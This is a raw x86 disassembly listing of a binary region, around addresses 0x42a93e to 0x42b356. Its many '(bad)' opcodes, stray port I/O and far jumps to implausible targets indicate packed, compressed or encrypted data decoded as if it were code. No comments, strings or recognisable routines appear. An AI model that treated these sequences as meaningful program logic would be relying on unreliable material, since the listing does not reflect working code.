  42a93e:	aas    
  42a93f:	out    0x6e,eax
  42a941:	je     0x42a98e
  42a943:	pop    es
  42a944:	ds pop ebp
  42a946:	pop    eax
  42a947:	push   cs
  42a948:	and    BYTE PTR [ebx+0x36f602f9],bl
  42a94e:	pop    ebx
  42a94f:	(bad)
  42a952:	or     al,0xd3
  42a954:	xor    BYTE PTR [edi],0x1c
  42a957:	xor    ecx,eax
  42a959:	push   eax
  42a95a:	call   0xc2048ee8
  42a95f:	mov    esi,0x6029fc7b
  42a964:	test   dh,0xee
  42a967:	xchg   esi,eax
  42a968:	dec    edx
  42a969:	(bad)  
  42a96b:	sbb    ecx,ecx
  42a96d:	cmp    DWORD PTR [ebp+esi*8+0x5a],0x36
  42a972:	ret    0x2791
  42a975:	adc    DWORD PTR [esi+0x69],esi
  42a978:	mov    dl,0x7c
  42a97a:	stos   DWORD PTR es:[edi],eax
  42a97b:	mov    bl,0xbb
  42a97d:	mov    ss,esp
  42a97f:	inc    edi
  42a980:	sub    BYTE PTR [edx],dl
  42a982:	dec    ecx
  42a983:	adc    DWORD PTR [edx],ebp
  42a985:	inc    eax
  42a986:	jecxz  0x42a924
  42a988:	mov    bh,0xcf
  42a98a:	mov    ecx,gs
  42a98c:	mov    eax,0x5334bb
	...
  42a9f1:	add    BYTE PTR [eax],al
  42a9f3:	add    BYTE PTR [eax+0x3fee1d93],ch
  42a9f9:	out    dx,al
  42a9fa:	sti    
  42a9fb:	xlat   BYTE PTR ds:[ebx]
  42a9fc:	in     eax,0xd3
  42a9fe:	aad    0x7
  42aa00:	and    bh,BYTE PTR [ecx]
  42aa02:	add    ch,BYTE PTR [esp+eiz*4+0x40001c7]
  42aa09:	add    DWORD PTR [eax],eax
  42aa0b:	add    BYTE PTR [eax+0x77fcfb61],bl
  42aa11:	fwait
  42aa12:	jp     0x42a9ad
  42aa14:	mov    edx,0x53635eb2
  42aa19:	nop
  42aa1a:	rcr    BYTE PTR [esi-0x32],cl
  42aa1d:	adc    DWORD PTR [ecx-0x4700cd12],ecx
  42aa23:	test   al,0xd4
  42aa25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42aa26:	stos   DWORD PTR es:[edi],eax
  42aa27:	in     al,0xb4
  42aa29:	lock fs stc 
  42aa2c:	pop    ebx
  42aa2d:	sbb    al,0xdd
  42aa2f:	stos   BYTE PTR es:[edi],al
  42aa30:	adc    BYTE PTR gs:[edi+0x3510b244],dh
  42aa37:	jmp    0x21597f2f
  42aa3c:	pop    ebp
  42aa3d:	fdiv   QWORD PTR [edi+0x11]
  42aa40:	mov    ?,WORD PTR [edx+0x1ad545c7]
  42aa46:	out    0xbc,al
  42aa48:	mov    bl,0x4
  42aa4a:	mov    dh,0x65
  42aa4c:	cld    
  42aa4d:	mov    esp,0x2be232d1
  42aa52:	sub    edi,ebx
  42aa54:	push   esp
  42aa55:	mov    WORD PTR [ecx-0xe8d1f12],gs
  42aa5b:	jb     0x42aa74
  42aa5d:	add    esi,DWORD PTR [bp+si]
  42aa60:	dec    ecx
  42aa61:	shr    BYTE PTR [esi-0x28ad44d3],cl
  42aa67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42aa68:	push   ss
  42aa69:	cmp    DWORD PTR [edx-0x48],esp
  42aa6c:	pop    ss
  42aa6d:	adc    al,0xe
  42aa6f:	sbb    BYTE PTR [esi-0x28],0x4f
  42aa73:	ret    
  42aa74:	dec    ebp
  42aa75:	daa    
  42aa76:	mov    ecx,0xfe316df7
  42aa7b:	and    BYTE PTR [eax-0x56],dl
  42aa7e:	js     0x42aa30
  42aa80:	repnz lds edx,FWORD PTR [edi+0x3a]
  42aa84:	js     0x42aa86
  42aa86:	mov    ch,0x9e
  42aa88:	sub    dh,ah
  42aa8a:	or     edx,edx
  42aa8c:	fs inc edi
  42aa8e:	xor    ch,BYTE PTR [ebx]
  42aa90:	xchg   edx,eax
  42aa91:	sbb    ah,BYTE PTR [eax-0x30f51f50]
  42aa97:	clc    
  42aa98:	loopne 0x42aab8
  42aa9a:	sbb    BYTE PTR [edx+0x311ea9],bl
  42aaa0:	inc    edi
  42aaa1:	cmp    al,0x84
  42aaa3:	pushf  
  42aaa4:	daa    
  42aaa5:	mov    eax,ds:0xfc5644d6
  42aaaa:	aas    
  42aaab:	fstp   QWORD PTR [esi-0x61]
  42aaae:	fild   WORD PTR [esi]
  42aab0:	mov    al,ah
  42aab2:	sub    ecx,esi
  42aab4:	push   0x4297551c
  42aab9:	ret    0x988d
  42aabc:	lock into 
  42aabe:	test   DWORD PTR [ebp+0x66bb7978],ebx
  42aac4:	cwde   
  42aac5:	fistp  DWORD PTR [ebx-0x19451cd8]
  42aacb:	(bad)  
  42aacd:	cld    
  42aace:	ror    DWORD PTR [edx-0x7c],0x71
  42aad2:	addr16 or al,0x3b
  42aad5:	in     eax,dx
  42aad6:	add    al,0x84
  42aad8:	mov    esi,0xbe044631
  42aadd:	je     0x42aac3
  42aadf:	test   BYTE PTR [esi+ecx*1],cl
  42aae2:	cmp    eax,0xb177173c
  42aae7:	int    0x3e
  42aae9:	jo     0x42aadf
  42aaeb:	adc    esi,ecx
  42aaed:	pop    esp
  42aaee:	ds sub cl,cl
  42aaf1:	fsub   st(4),st
  42aaf3:	push   edi
  42aaf4:	pop    edi
  42aaf5:	mov    eax,ds:0xc65a912f
  42aafa:	repz push ebp
  42aafc:	xlat   BYTE PTR ds:[ebx]
  42aafd:	outs   dx,DWORD PTR ds:[esi]
  42aafe:	sbb    ebp,DWORD PTR [eax+0x1]
  42ab01:	and    al,0x73
  42ab03:	cmp    BYTE PTR [edx-0x26],dl
  42ab06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ab07:	cs add al,0x89
  42ab0a:	adc    DWORD PTR [ecx-0x59],ebx
  42ab0d:	and    cl,BYTE PTR [ebx+0x1a]
	...
  42ab73:	add    BYTE PTR [esi],bh
  42ab75:	push   cs
  42ab76:	sub    al,0x5d
  42ab78:	cmp    al,0x7f
  42ab7a:	jg     0x42abeb
  42ab7c:	and    BYTE PTR [eax],cl
  42ab7e:	mov    dl,0x43
  42ab80:	into   
  42ab81:	xor    ecx,DWORD PTR [edx+0x4f]
  42ab84:	test   al,0xc8
  42ab86:	add    DWORD PTR [eax],eax
  42ab88:	add    al,0x1
  42ab8a:	add    BYTE PTR [eax],al
  42ab8c:	stc    
  42ab8d:	mov    ebx,0xc4ca1e3a
  42ab92:	cmp    dl,BYTE PTR [edx+0x651b977e]
  42ab98:	das    
  42ab99:	cmp    DWORD PTR [ebp-0x590a1172],0xa643dfd7
  42aba3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42aba4:	cmp    esp,DWORD PTR [edi+0x10]
  42aba7:	and    BYTE PTR [eax],bh
  42aba9:	xchg   edx,eax
  42abaa:	neg    eax
  42abac:	pushw  0xffc0
  42abaf:	imul   ebp,eax,0x215897fb
  42abb5:	fidiv  DWORD PTR [edx+0x721cbbb4]
  42abbb:	test   eax,0x266bdf37
  42abc0:	mov    al,0x3a
  42abc2:	retf   
  42abc3:	cmp    ebp,ebp
  42abc5:	mov    cl,0x82
  42abc7:	int    0x4e
  42abc9:	pop    edi
  42abca:	push   ebx
  42abcb:	jne    0x42abac
  42abcd:	mov    ebx,0x2c8d47d3
  42abd2:	xlat   BYTE PTR ds:[ebx]
  42abd3:	cs xor esi,ecx
  42abd6:	adc    ebp,DWORD PTR [ecx]
  42abd8:	ds in  eax,0x72
  42abdb:	xchg   DWORD PTR [esi+0x5b],ecx
  42abde:	xlat   BYTE PTR ds:[ebx]
  42abdf:	(bad)  
  42abe0:	in     al,0xa8
  42abe2:	js     0x42abb3
  42abe4:	add    DWORD PTR [esi-0x6b],edx
  42abe7:	adc    al,0x3e
  42abe9:	imul   esp,ecx,0xab94c16f
  42abef:	mov    BYTE PTR [eax],al
  42abf1:	mov    cs,esi
  42abf3:	imul   ecx,DWORD PTR [edx],0xf3b547b
  42abf9:	jmp    0x460d:0x8854187c
  42ac00:	fidiv  WORD PTR [ebp-0x5d]
  42ac03:	enter  0xa8ca,0x30
  42ac07:	xchg   esp,eax
  42ac08:	sub    cl,ch
  42ac0a:	daa    
  42ac0b:	jle    0x42abd8
  42ac0d:	push   edi
  42ac0e:	mov    esi,0x8265c41b
  42ac13:	xchg   edi,ecx
  42ac15:	pop    ebp
  42ac16:	imul   ebx,DWORD PTR [ebx+0x4b],0xffffffb5
  42ac1a:	fdiv   QWORD PTR [edx+0x45]
  42ac1d:	mov    bh,0x3d
  42ac1f:	inc    esi
  42ac20:	mov    dl,0x21
  42ac22:	retf   0x1565
  42ac25:	lods   al,BYTE PTR ds:[esi]
  42ac26:	mov    ecx,0x5c7a82ed
  42ac2b:	pop    ecx
  42ac2c:	inc    ecx
  42ac2d:	gs int3 
  42ac2f:	pop    ebp
  42ac30:	jnp    0x42abd0
  42ac32:	and    ch,BYTE PTR [edx+0x1f]
  42ac35:	adc    al,0xf4
  42ac37:	inc    ebp
  42ac38:	jmp    0x42ac76
  42ac3a:	rol    BYTE PTR [esi],0xa7
  42ac3d:	sahf   
  42ac3e:	inc    eax
  42ac3f:	pop    ds
  42ac40:	cld    
  42ac41:	jnp    0x42ac54
  42ac43:	mov    al,0xc8
  42ac45:	sbb    cl,bl
  42ac47:	mov    ecx,0x7692a019
  42ac4c:	sbb    al,0xd2
  42ac4e:	push   ebp
  42ac4f:	adc    dh,dh
  42ac51:	(bad)  
  42ac52:	shr    BYTE PTR [ebp-0x4d49ceb6],1
  42ac58:	les    ebx,FWORD PTR [esi-0x3d]
  42ac5b:	jmp    0x7a037bc9
  42ac60:	loopne 0x42ac08
  42ac62:	lock scas al,BYTE PTR es:[edi]
  42ac64:	xchg   esp,eax
  42ac65:	or     ecx,DWORD PTR [edx-0x2d]
  42ac68:	mov    edx,0x3955ca9
  42ac6d:	(bad)  
  42ac6e:	ins    BYTE PTR es:[edi],dx
  42ac6f:	mov    bl,0x53
  42ac71:	hlt    
  42ac72:	push   edx
  42ac73:	add    BYTE PTR [esi+0x42],0xb9
  42ac77:	dec    esp
  42ac78:	mov    gs,WORD PTR [esi]
  42ac7a:	retf   
  42ac7b:	push   ss
  42ac7c:	sub    al,0xa
  42ac7e:	xchg   esi,eax
  42ac7f:	fiadd  WORD PTR [esp+ebp*8+0x76]
  42ac83:	push   edi
  42ac84:	mov    bl,0x8
  42ac86:	add    al,0xeb
  42ac88:	pop    ss
  42ac89:	imul   edx,edi,0xdabdaaa8
  42ac8f:	xchg   edi,eax
	...
  42acf4:	jmp    0xdf7cc92b
  42acf9:	ds out dx,eax
  42acfb:	repz ret 
  42acfd:	fcom   DWORD PTR [edx+0x72]
  42ad00:	lods   eax,DWORD PTR ds:[esi]
  42ad01:	int    0x27
  42ad03:	inc    edi
  42ad04:	lods   al,BYTE PTR ds:[esi]
  42ad05:	leave  
  42ad06:	add    DWORD PTR [eax],eax
  42ad08:	add    al,0x1
  42ad0a:	add    BYTE PTR [eax],al
  42ad0c:	pop    ebp
  42ad0d:	or     BYTE PTR [edi],bh
  42ad0f:	shl    BYTE PTR gs:[edx-0x3a],0x75
  42ad14:	push   0x47
  42ad16:	repnz dec edx
  42ad18:	jmp    0x98bc:0x90bf7ad0
  42ad1f:	nop
  42ad20:	ins    DWORD PTR es:[edi],dx
  42ad21:	int3   
  42ad22:	shl    DWORD PTR [edi],0xf0
  42ad25:	xor    eax,0x45d9c0f0
  42ad2a:	and    DWORD PTR [edi],edi
  42ad2c:	xchg   ebp,eax
  42ad2d:	dec    esp
  42ad2e:	pop    edi
  42ad2f:	sysenter 
  42ad31:	scas   eax,DWORD PTR es:[edi]
  42ad32:	stc    
  42ad33:	xchg   bl,cl
  42ad35:	fldenv [eax-0x5d4e8074]
  42ad3b:	movmskps esp,xmm2
  42ad3e:	popa   
  42ad3f:	lods   eax,DWORD PTR ds:[esi]
  42ad40:	mov    edi,0xf6f2216b
  42ad45:	fwait
  42ad46:	shl    bh,0x61
  42ad49:	lods   al,BYTE PTR ds:[esi]
  42ad4a:	cmp    BYTE PTR [edi+0x7715f248],0x89
  42ad51:	popf   
  42ad52:	lock sti 
  42ad54:	loop   0x42ad80
  42ad56:	pop    ss
  42ad57:	or     eax,0xfae21040
  42ad5c:	add    DWORD PTR [esi],eax
  42ad5e:	adc    BYTE PTR [ebp+0x3b],0x51
  42ad62:	jo     0x42ad7a
  42ad64:	sbb    BYTE PTR [edx-0x74],dh
  42ad67:	add    DWORD PTR [ecx],0x2909a117
  42ad6d:	fld    QWORD PTR [ebx-0x17d0135a]
  42ad73:	jecxz  0x42add2
  42ad75:	dec    DWORD PTR [edi+0x73]
  42ad78:	call   0xeb5e:0x5144fc4a
  42ad7f:	xchg   ebx,eax
  42ad80:	dec    edi
  42ad81:	icebp  
  42ad82:	push   eax
  42ad83:	fucomip st,st(5)
  42ad85:	pop    es
  42ad86:	adc    ah,BYTE PTR ds:[esi+0x48]
  42ad8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ad8b:	sbb    cl,ch
  42ad8d:	jne    0x42ad71
  42ad8f:	inc    esi
  42ad90:	lods   eax,DWORD PTR ds:[esi]
  42ad91:	and    BYTE PTR [edi],al
  42ad93:	xor    eax,0xbc2d984f
  42ad98:	mov    ds:0x760099e2,eax
  42ad9d:	inc    edi
  42ad9e:	les    edi,FWORD PTR [eax-0x79ccf804]
  42ada4:	mul    BYTE PTR [edi+0x6b]
  42ada7:	sbb    bl,BYTE PTR [eax+edx*4-0x458f2d68]
  42adae:	jmp    0x42ae2f
  42adb0:	or     eax,0x3aebfa31
  42adb5:	outs   dx,BYTE PTR ds:[esi]
  42adb6:	sub    edi,DWORD PTR [eax-0x7c]
  42adb9:	lods   al,BYTE PTR ds:[esi]
  42adba:	sar    DWORD PTR [eax+0x39],cl
  42adbd:	pop    ecx
  42adbe:	jnp    0x42ad89
  42adc0:	mov    ch,0x2b
  42adc2:	or     eax,0xd07dc3c3
  42adc7:	mov    ecx,0x7ab6dc90
  42adcc:	nop
  42adcd:	test   al,al
  42adcf:	stc    
  42add0:	inc    eax
  42add1:	out    dx,al
  42add2:	shr    BYTE PTR [edx-0x6a348044],1
  42add8:	adc    DWORD PTR [ebx-0x2d7efc45],ebp
  42adde:	pop    edi
  42addf:	mov    ds:0x61c0ecac,eax
  42ade4:	sub    BYTE PTR [eax+0x449e39c5],dh
  42adea:	and    ch,0xe6
  42aded:	je     0x42addc
  42adef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42adf0:	xor    bh,ah
  42adf2:	in     al,dx
  42adf3:	and    ecx,ebp
  42adf5:	test   BYTE PTR [edx+0x7bc23338],0xc3
  42adfc:	dec    eax
  42adfd:	ss int3 
  42adff:	(bad)  
  42ae00:	or     ah,BYTE PTR [esi]
  42ae02:	retf   
  42ae03:	mov    dh,0x8d
  42ae05:	add    al,0x12
  42ae07:	xchg   DWORD PTR [ecx],esp
  42ae09:	sbb    DWORD PTR [edx+0x48598432],0x96
	...
  42ae73:	add    BYTE PTR [edi+0x4a8e4af7],bh
  42ae79:	mov    edi,0x7bd8f7ff
  42ae7e:	mov    dh,0xb9
  42ae80:	add    BYTE PTR [esp+esi*4+0x1cab00f],ah
  42ae87:	add    BYTE PTR [ecx+eax*1],al
  42ae8a:	add    BYTE PTR [eax],al
  42ae8c:	mov    al,ds:0x13ac5a64
  42ae91:	scas   al,BYTE PTR es:[edi]
  42ae92:	xor    ebp,DWORD PTR [esi-0x137010f1]
  42ae98:	push   edx
  42ae99:	fstp   QWORD PTR [edi]
  42ae9b:	jbe    0x42aef0
  42ae9d:	in     eax,dx
  42ae9e:	pop    esi
  42ae9f:	sub    DWORD PTR [ecx+0x70],esi
  42aea2:	(bad)  
  42aea4:	aas    
  42aea5:	sub    DWORD PTR [ebx-0x571fa56f],esp
  42aeab:	mov    bh,BYTE PTR [edi]
  42aead:	test   BYTE PTR [esi],bl
  42aeaf:	clc    
  42aeb0:	push   ebx
  42aeb1:	shr    DWORD PTR [esi-0x74d89fa2],1
  42aeb7:	sbb    eax,0xd1c1424
  42aebc:	fisttp DWORD PTR [eax+0x25]
  42aebf:	dec    edi
  42aec0:	lahf   
  42aec1:	rol    bh,1
  42aec3:	arpl   WORD PTR [ebp+0x5be3a33e],sp
  42aec9:	adc    DWORD PTR [edi],ebp
  42aecb:	arpl   WORD PTR [ebp-0x97ba4d8],si
  42aed1:	push   edi
  42aed2:	mov    eax,0x8ab4b0ff
  42aed7:	jo     0x42af17
  42aed9:	je     0x42aeee
  42aedb:	mov    esp,0x2a075e48
  42aee0:	mov    dl,0x6b
  42aee2:	(bad)  
  42aee3:	fsubp  st(1),st
  42aee5:	adc    DWORD PTR [edx+0x941d80c],ecx
  42aeeb:	cmp    BYTE PTR [esi-0x7c],ch
  42aeee:	jg     0x42ae8f
  42aef0:	inc    ecx
  42aef1:	push   ds
  42aef2:	jmp    0xeb41964
  42aef7:	in     al,0xed
  42aef9:	cld    
  42aefa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42aefb:	push   ecx
  42aefc:	sar    BYTE PTR [eax+0x4c],0xb5
  42af00:	or     BYTE PTR [esi+ecx*2],cl
  42af03:	xor    DWORD PTR ds:0x2ba08ee1,0xffffffe3
  42af0a:	addr16 jmp 0x69c3:0xf080b043
  42af12:	ins    DWORD PTR es:[edi],dx
  42af13:	push   eax
  42af14:	out    0x2,eax
  42af16:	stos   BYTE PTR es:[edi],al
  42af17:	push   ecx
  42af18:	(bad)  
  42af19:	xor    al,0xa5
  42af1b:	pop    edx
  42af1c:	stc    
  42af1d:	mov    ecx,0x9fde70a7
  42af22:	push   ds
  42af23:	inc    eax
  42af24:	mov    ds:0xec8fed4c,al
  42af29:	and    eax,0x10f576d1
  42af2e:	outs   dx,BYTE PTR ds:[esi]
  42af2f:	or     BYTE PTR [edx],dl
  42af31:	sub    cl,BYTE PTR [ebx]
  42af33:	adc    al,0x57
  42af35:	push   esi
  42af36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42af37:	cmp    cl,al
  42af39:	je     0x42af57
  42af3b:	push   ebx
  42af3c:	shl    BYTE PTR [ecx],0x8a
  42af3f:	aad    0x71
  42af41:	push   ebp
  42af42:	jns    0x42af02
  42af44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42af45:	popf   
  42af46:	in     eax,dx
  42af47:	adc    al,0x21
  42af49:	repz test BYTE PTR [ecx-0x7f6fe1bd],0xfd
  42af51:	mov    ds:0x44cbf508,eax
  42af56:	pop    ebp
  42af57:	mov    al,ds:0xe95a9bd8
  42af5c:	dec    eax
  42af5d:	imul   eax,DWORD PTR [esi+0x5e6abd39],0xffffffee
  42af64:	jge    0x42af07
  42af66:	out    0xb3,eax
  42af68:	sbb    edi,ecx
  42af6a:	xchg   edi,eax
  42af6b:	addr16 push 0x2a
  42af6e:	add    dh,BYTE PTR [edx+0x50]
  42af71:	mov    dl,0x75
  42af73:	test   bl,0x3d
  42af76:	fcmovbe st,st(3)
  42af78:	and    DWORD PTR [ebx],eax
  42af7a:	or     bh,BYTE PTR [esi-0xa67cc79]
  42af80:	pushf  
  42af81:	scas   al,BYTE PTR es:[edi]
  42af82:	add    DWORD PTR [esi-0x2b],0x725067c8
  42af89:	add    esp,ebp
  42af8b:	scas   eax,DWORD PTR es:[edi]
  42af8c:	sti    
  42af8d:	push   esi
  42af8e:	loope  0x42afa3
	...
  42aff4:	stc    
  42aff5:	enter  0xdc7a,0x7b
  42aff9:	(bad)  
  42affa:	(bad)  
  42affb:	in     eax,dx
  42affc:	sbb    al,0x4f
  42affe:	push   ebp
  42afff:	inc    esp
  42b000:	sub    eax,0xb47f90ae
  42b005:	retf   
  42b006:	add    DWORD PTR [eax],eax
  42b008:	add    al,0x1
  42b00a:	add    BYTE PTR [eax],al
  42b00c:	xchg   esi,eax
  42b00d:	or     DWORD PTR [esi+edx*2],eax
  42b010:	inc    edi
  42b011:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b012:	sub    eax,DWORD PTR [ebx]
  42b014:	sub    edi,DWORD PTR [ebx-0x14f30d0d]
  42b01a:	lds    eax,FWORD PTR [edx+0x730b7873]
  42b020:	jl     0x42afab
  42b022:	sub    BYTE PTR [esi-0x24],dl
  42b025:	xor    dh,dh
  42b027:	xchg   BYTE PTR [ecx+0x39],ah
  42b02a:	fnstsw WORD PTR [esi+0x7]
  42b02d:	mov    al,0x76
  42b02f:	popa   
  42b030:	add    al,0x16
  42b032:	xchg   ch,bl
  42b034:	add    eax,0xcc0674aa
  42b039:	mov    bh,BYTE PTR [edi]
  42b03b:	push   ebp
  42b03c:	sar    BYTE PTR [edx+0x56],cl
  42b03f:	in     al,dx
  42b040:	adc    eax,eax
  42b042:	mov    bh,0xae
  42b044:	mov    cl,0xdf
  42b046:	jno    0x42b068
  42b048:	test   eax,0x4f8b316a
  42b04d:	xor    ah,BYTE PTR [ecx]
  42b04f:	scas   eax,DWORD PTR es:[edi]
  42b050:	arpl   sp,di
  42b052:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b053:	push   ebp
  42b054:	mov    ds:0x275a58c0,eax
  42b05a:	(bad)  
  42b05b:	test   BYTE PTR [eax],0x37
  42b05e:	sub    DWORD PTR [eax-0x39],ecx
  42b061:	push   eax
  42b062:	or     ebx,ecx
  42b064:	mov    ebx,DWORD PTR [ecx+edi*2]
  42b067:	sbb    BYTE PTR [esi+ecx*8],dl
  42b06a:	shr    BYTE PTR [ebp-0x3082d37d],1
  42b070:	pop    ss
  42b071:	cmp    al,0x22
  42b073:	pop    ebx
  42b074:	sbb    DWORD PTR [ebx-0x18c4a2d1],ebp
  42b07a:	mov    esp,0xbe1dc737
  42b07f:	fs adc bl,dh
  42b082:	jg     0x42b00d
  42b084:	test   al,0xdd
  42b086:	cwde   
  42b087:	sub    ch,al
  42b089:	jg     0x42b057
  42b08b:	mov    dl,0x82
  42b08d:	pop    edi
  42b08e:	call   0x865bb6ef
  42b093:	shr    BYTE PTR [esi-0x33d81fa1],1
  42b099:	jb     0x42b065
  42b09b:	mov    ebp,0x473d90d2
  42b0a0:	(bad)  
  42b0a1:	pop    ecx
  42b0a2:	push   cs
  42b0a3:	and    ecx,DWORD PTR [eax+0x70]
  42b0a6:	add    al,0xc0
  42b0a8:	or     BYTE PTR [eax],bl
  42b0aa:	test   eax,0xcab34271
  42b0af:	xchg   DWORD PTR [edi+0x46a3c2d4],edi
  42b0b5:	sub    BYTE PTR [ebp-0x14],dl
  42b0b8:	mov    al,ds:0xa9698d8a
  42b0bd:	test   eax,0x1f084bb0
  42b0c2:	adc    al,0xbc
  42b0c4:	or     esp,DWORD PTR cs:[eax]
  42b0c7:	push   0xffffffaa
  42b0c9:	pop    edi
  42b0ca:	dec    esi
  42b0cb:	imul   esi,DWORD PTR [edi],0xc28889f4
  42b0d1:	loop   0x42b0bc
  42b0d3:	pop    edi
  42b0d4:	sub    dl,al
  42b0d6:	ror    BYTE PTR [ebx-0xc2d9034],1
  42b0dc:	pusha  
  42b0dd:	es jno 0x42b0eb
  42b0e0:	out    dx,eax
  42b0e1:	adc    dl,bl
  42b0e3:	inc    edi
  42b0e4:	push   ecx
  42b0e5:	dec    esi
  42b0e6:	and    al,0xe6
  42b0e8:	imul   ecx,ebp,0x8
  42b0eb:	jo     0x42b077
  42b0ed:	lock popf 
  42b0ef:	xor    dh,BYTE PTR [eax-0x70]
  42b0f2:	push   edi
  42b0f3:	pop    ebx
  42b0f4:	or     eax,0x77543eef
  42b0f9:	or     DWORD PTR [esi-0x93b9e33],eax
  42b0ff:	jecxz  0x42b14f
  42b101:	xor    eax,0x878e69bd
  42b106:	fdiv   QWORD PTR [ecx-0x24ab6d3c]
  42b10c:	shr    BYTE PTR [ebx-0x24],1
  42b10f:	je     0x42b111
	...
  42b171:	add    BYTE PTR [eax],al
  42b173:	add    BYTE PTR [ebp+0x25],dh
  42b176:	imul   ebx,DWORD PTR [edi-0x51]
  42b17a:	cmc    
  42b17b:	call   eax
  42b17d:	inc    ebx
  42b17e:	push   edi
  42b17f:	popa   
  42b180:	ds jbe 0x42b1f3
  42b183:	call   0x447e40
  42b188:	add    al,0x1
  42b18a:	add    BYTE PTR [eax],al
  42b18c:	(bad)  
  42b18d:	in     eax,0x90
  42b18f:	add    bh,0x77
  42b192:	enter  0xc3e7,0xe3
  42b196:	push   0xdb65603b
  42b19b:	jmp    0x42b20a
  42b19d:	fsubp  st(0),st
  42b19f:	sar    BYTE PTR [edx-0x6d],cl
  42b1a2:	xor    eax,0xf3766342
  42b1a7:	data16 jnp 0x42b1c2
  42b1aa:	or     al,0x94
  42b1ac:	daa    
  42b1ad:	ret    0x51d6
  42b1b0:	adc    cl,BYTE PTR [edi-0x7d435be5]
  42b1b6:	jae    0x42b1e6
  42b1b8:	into   
  42b1b9:	loope  0x42b1ef
  42b1bb:	addr16 xor dh,al
  42b1be:	retf   0xa87e
  42b1c1:	test   eax,0xcf19839c
  42b1c6:	or     BYTE PTR [eax+0x3e],0x22
  42b1ca:	mov    ss,WORD PTR [eax+0x695a8a3d]
  42b1d0:	sub    cl,BYTE PTR [edi]
  42b1d2:	repz cmp ebx,DWORD PTR [edx-0xf04b891]
  42b1d9:	or     DWORD PTR [ebx+0x1f],eax
  42b1dc:	rcr    BYTE PTR [ecx-0x48affa9f],1
  42b1e2:	cs or  eax,0x43c47be6
  42b1e8:	jmp    0x42b1e6
  42b1ea:	fisub  WORD PTR [esi]
  42b1ec:	lods   al,BYTE PTR ds:[esi]
  42b1ed:	mov    eax,0xa0787ae
  42b1f2:	or     dl,BYTE PTR [ebp-0x33]
  42b1f5:	sbb    al,ch
  42b1f7:	test   al,0xa3
  42b1f9:	in     al,0xa2
  42b1fb:	pop    ecx
  42b1fc:	add    al,0xb6
  42b1fe:	jne    0x42b222
  42b200:	sub    eax,DWORD PTR [esp+ebp*4]
  42b203:	push   edi
  42b204:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b205:	ins    DWORD PTR es:[edi],dx
  42b206:	add    bh,BYTE PTR [ebx+0x3c7ad9e3]
  42b20c:	enter  0xe69e,0x34
  42b210:	in     eax,dx
  42b211:	jns    0x42b252
  42b213:	or     BYTE PTR [ecx+0x1f],dl
  42b216:	dec    ebx
  42b217:	jnp    0x42b1e8
  42b219:	ficom  DWORD PTR [ebx+0x3a0777fd]
  42b21f:	ins    BYTE PTR es:[edi],dx
  42b220:	sub    eax,0x69a40429
  42b225:	inc    ebx
  42b226:	lods   al,BYTE PTR ds:[esi]
  42b227:	bound  eax,QWORD PTR [ebp-0x44beda0d]
  42b22d:	fisttp QWORD PTR [edx]
  42b22f:	sub    ecx,esi
  42b231:	xchg   ebp,eax
  42b232:	in     eax,dx
  42b233:	frstor [edi-0x5c]
  42b236:	mov    bh,0xd
  42b238:	test   al,0xde
  42b23a:	push   esp
  42b23b:	jl     0x42b2ba
  42b23d:	mov    WORD PTR [ebx-0xd],cs
  42b240:	sub    BYTE PTR [eax+ebx*8+0x63],ch
  42b244:	inc    ecx
  42b245:	(bad)  
  42b246:	sbb    esp,esi
  42b248:	inc    edi
  42b249:	mov    DWORD PTR [edx+ebx*8+0x10734eb5],edi
  42b250:	adc    eax,0x2ba8aba2
  42b255:	pop    ss
  42b256:	mov    ebx,0xc72b6af0
  42b25b:	jle    0x42b257
  42b25d:	mov    es,edx
  42b25f:	mov    bh,0x42
  42b261:	int3   
  42b262:	fwait
  42b263:	lea    edi,[eax+edi*1+0x16]
  42b267:	rcr    BYTE PTR [ebx],cl
  42b269:	(bad)  
  42b26b:	pop    ebx
  42b26c:	sbb    eax,0xaae5e625
  42b271:	push   ss
  42b272:	xchg   ebx,eax
  42b273:	stos   BYTE PTR es:[edi],al
  42b274:	mov    ecx,0x5eb2f61e
  42b279:	mov    al,ds:0x41a16b57
  42b27e:	mov    DWORD PTR [edi],eax
  42b280:	inc    eax
  42b281:	fdiv   DWORD PTR [edi-0x1c49204b]
  42b287:	(bad)  
  42b288:	bnd fs jne 0x42b27b
  42b28c:	xchg   ebp,eax
  42b28d:	nop
  42b28e:	lock data16 add BYTE PTR [eax],al
	...
  42b2f2:	add    BYTE PTR [eax],al
  42b2f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b2f5:	mov    ds,WORD PTR [ecx-0x28844a0]
  42b2fb:	iret   
  42b2fc:	sub    eax,0x77738e65
  42b301:	stos   DWORD PTR es:[edi],eax
  42b302:	jmp    0x2106f99
  42b307:	add    BYTE PTR [ecx+eax*1],al
  42b30a:	add    BYTE PTR [eax],al
  42b30c:	jecxz  0x42b373
  42b30e:	sub    al,0x40
  42b310:	or     dh,BYTE PTR [esi+0x1d]
  42b313:	cmp    eax,eax
  42b315:	sti    
  42b316:	lea    ebx,[ecx]
  42b318:	test   eax,0x6a90db51
  42b31d:	sub    DWORD PTR [edi-0x1e],0x75686321
  42b324:	jmp    0x55267c8c
  42b329:	inc    edx
  42b32a:	sahf   
  42b32b:	jle    0x42b335
  42b32d:	(bad)  [ebp-0x8]
  42b330:	mov    ebp,0x383adf14
  42b335:	iret   
  42b336:	adc    bl,BYTE PTR [ebx+edi*8]
  42b339:	mov    dl,0xdf
  42b33b:	mov    al,ds:0xb3c190d7
  42b340:	fsubr  DWORD PTR [ecx]
  42b342:	push   cs
  42b343:	jg     0x42b2cb
  42b345:	mov    esp,0xa5285ef5
  42b34a:	mov    ebp,0xdb6cd3b6
  42b34f:	jl     0x42b395
  42b351:	das    
  42b352:	clc    
  42b353:	imul   cl
  42b355:	dec    ecx
  42b356:	and    edx,DWORD PTR [eax-0x67]
